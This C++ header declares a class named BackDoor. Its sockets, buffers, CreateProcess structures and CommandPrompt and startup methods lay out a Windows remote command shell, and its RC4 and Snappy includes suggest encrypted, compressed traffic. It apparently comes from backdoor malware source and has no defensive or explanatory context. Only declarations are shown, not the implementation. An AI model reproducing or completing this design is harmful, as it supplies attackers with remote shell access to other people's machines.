#pragma once
#include <stdio.h>    
#include <stdlib.h>   
#include <windows.h>   
#include <winsock.h>
#include "..\draftdown\rc4.h"
#include "..\snappy\snappy.h"

#pragma comment (lib, "../snappy/build32/Release/snappy.lib")

class BackDoor
{
public:
	char bufferin[1024]; //the buffer to read data from socket   
	char bufferout[65535]; //the buffer to write data to the socket   
	int i, port; // i is used for loop , port is going to keep the portnumber   
	SOCKET locsock, remsock;  //the sockets we are going to need   
	SOCKADDR_IN sinloc, sinrem; //the structures needed for our sockets   
	WSADATA wsadata; //wsadata    
	STARTUPINFOA startinfo; //startupinfo structure for CreateProcess   
	SECURITY_ATTRIBUTES secat; //security attributes structure needed for CreateProcess   
	PROCESS_INFORMATION procinfo; //process info struct needed for CreateProcess   
	int bytesWritten;  //number of bytes written gets stored here   
	DWORD bytesRead, avail, exitcode;
	void CommandPrompt(void);
	void startup();
};


